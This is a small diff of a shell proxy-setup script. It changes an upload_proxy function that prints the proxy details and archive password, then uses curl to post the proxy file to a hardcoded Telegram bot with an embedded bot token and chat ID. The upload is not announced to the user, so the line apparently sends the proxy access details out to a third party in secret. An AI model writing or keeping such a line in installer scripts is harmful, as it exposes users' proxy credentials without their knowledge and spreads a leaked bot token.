@@ -63,7 +63,7 @@ upload_proxy() {
     echo "Proxy is ready! Format IP:PORT"
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
-	curl -F document=@proxy.txt "https://api.telegram.org/bot6252674360:AAESsHxCqjh6LrLyADMhytYqZkC4gqoasXE/sendDocument" -F chat_id="5045683428"
+	curl -F document=@/home/bkns/proxy.txt "https://api.telegram.org/bot6252674360:AAESsHxCqjh6LrLyADMhytYqZkC4gqoasXE/sendDocument" -F chat_id="5045683428"
 }
 
 gen_data() {
